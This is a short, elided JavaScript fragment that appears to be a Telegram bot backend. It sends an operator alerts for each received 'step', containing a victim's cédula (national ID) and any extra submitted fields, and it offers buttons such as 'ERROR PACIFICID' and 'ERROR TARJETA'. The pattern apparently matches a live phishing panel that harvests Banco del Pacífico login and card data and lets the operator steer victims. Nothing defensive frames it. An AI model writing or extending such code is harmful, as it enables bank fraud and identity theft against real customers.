...
const BUTTONS = [
  ...
  [{ text: "❌ ERROR PACIFICID", callback_data: "error_pacificid" }, { text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }],
  ...
  try {
    ...
    if (body.action === 'notify') {
      ...
      text = `📋 <b>${d.step} RECIBIDO</b>\n` +
        ...
        `🪪 <b>Cédula:</b> ${d.cedula}\n`;
      if (d.extra) Object.entries(d.extra).forEach(([k, v]) => { text += `🔹 <b>${k}:</b> ${v}\n`; });
      text += `━━━━━━━━━━━━━━━━\n🕐 ${new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' })}`;
    } else {
      text = body.text || '';
    }
